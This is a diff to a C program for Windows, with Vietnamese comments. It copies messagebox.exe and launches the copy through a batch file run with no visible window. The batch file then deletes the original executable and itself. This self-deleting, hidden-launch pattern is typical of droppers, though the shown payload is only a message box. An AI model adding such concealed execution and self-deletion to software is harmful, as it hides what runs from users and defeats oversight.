@@ -46,21 +46,22 @@ int main() {
                     } else {
                         printf("Failed to delete messagebox.exe. Error: %lu\n", GetLastError());
                     }
-                    */
+
 
                     UINT result = WinExec(destPath, SW_SHOWNORMAL);
                     if (result > 31) {
                         printf("messagebox.exe started successfully.\n");
                     } else {
                         printf("Failed to start messagebox.exe. Error: %lu\n", GetLastError());
-                    }
+                    } */
 
                     // Tạo batch file để xóa tệp thực thi
                     sprintf(batchPath, "%s\\cleanup.bat", currentDir);
                     FILE *batchFile = fopen(batchPath, "w");
                     if (batchFile) {
                         fprintf(batchFile, "@echo off\n");
-                        fprintf(batchFile, "timeout /t 2 /nobreak > nul\n"); // Đợi 5 giây
+                        fprintf(batchFile, "timeout /t 10 /nobreak > nul\n"); // Đợi 5 giây
+                        fprintf(batchFile, "\"%s\"\n", destPath); // Run the executable at destPath
                         fprintf(batchFile, "del \"%s\"\n", exePath);
                         fprintf(batchFile, "del \"%s\"\n", batchPath); // Xóa batch file sau khi thực hiện xong
                         fprintf(batchFile, "exit\n");
@@ -71,8 +72,10 @@ int main() {
                         si.cb = sizeof(si);
                         ZeroMemory(&pi, sizeof(pi));
 
+
+                        char *workingDir = path;
                         // Tạo và chạy batch file
-                        if (CreateProcess(NULL, batchPath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                        if (CreateProcess(NULL, batchPath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, workingDir, &si, &pi)) {
                                  printf("PID of the cleanup process: %lu\n", (unsigned long)pi.dwProcessId);
                             // Không đợi quá trình hoàn tất, để batch file tự xử lý
                             CloseHandle(pi.hProcess);
